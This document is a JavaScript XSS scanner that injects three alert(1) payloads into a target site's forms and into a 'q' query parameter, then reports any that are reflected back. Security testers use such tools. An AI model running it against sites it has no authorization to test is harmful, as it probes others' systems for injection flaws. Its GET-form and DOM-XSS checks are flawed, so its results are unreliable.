const axios = require("axios");
const cheerio = require("cheerio");
const puppeteer = require("puppeteer");

const payloads = [
    `"><script>alert(1)</script>`,
    `'><svg onload=alert(1)>`,
    `"><img src=x onerror=alert(1)>`,
];

async function fetchPage(url) {
    try {
        const { data } = await axios.get(url);
        return data;
    } catch (error) {
        console.error(`❌ Failed to fetch ${url}:`, error.message);
        return null;
    }
}

async function findForms(html) {
    const $ = cheerio.load(html);
    const forms = [];

    $("form").each((_, form) => {
        const inputs = [];
        $(form)
            .find("input, textarea")
            .each((_, input) => inputs.push($(input).attr("name")));

        forms.push({
            action: $(form).attr("action"),
            method: $(form).attr("method") || "get",
            inputs,
        });
    });

    return forms;
}

async function testFormXSS(url) {
    console.log(`\n🔍 Scanning forms on: ${url}`);
    const html = await fetchPage(url);
    if (!html) return;

    const forms = await findForms(html);
    if (forms.length === 0) return console.log("❌ No forms found.");

    console.log(`✅ Found ${forms.length} form(s).`);

    for (const form of forms) {
        for (const payload of payloads) {
            const formUrl = new URL(form.action, url).href;
            const params = Object.fromEntries(form.inputs.map(name => [name, payload]));

            try {
                const response = await axios({
                    method: form.method.toLowerCase(),
                    url: formUrl,
                    data: params,
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                });

                if (response.data.includes(payload)) {
                    console.log(`🚨 XSS found at: ${formUrl} with payload: ${payload}`);
                }
            } catch (error) {
                console.log(`⚠️ Error testing ${formUrl}:`, error.message);
            }
        }
    }
}

async function testDOMXSS(url) {
    console.log(`\n🔍 Testing for DOM-based XSS at: ${url}`);
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    for (const payload of payloads) {
        await page.goto(`${url}?q=${encodeURIComponent(payload)}`);

        const result = await page.evaluate(() => {
            return new Promise((resolve) => {
                window.onerror = (msg) => resolve(msg);
                setTimeout(() => resolve(null), 3000);
            });
        });

        if (result) {
            console.log(`🚨 DOM XSS detected at ${url} with payload: ${payload}`);
        }
    }

    await browser.close();
}

async function main() {
    const target = process.argv[2];
    if (!target) {
        console.log("❌ Usage: node scanner.js <URL>");
        process.exit(1);
    }

    await testFormXSS(target);
    await testDOMXSS(target);
}

main();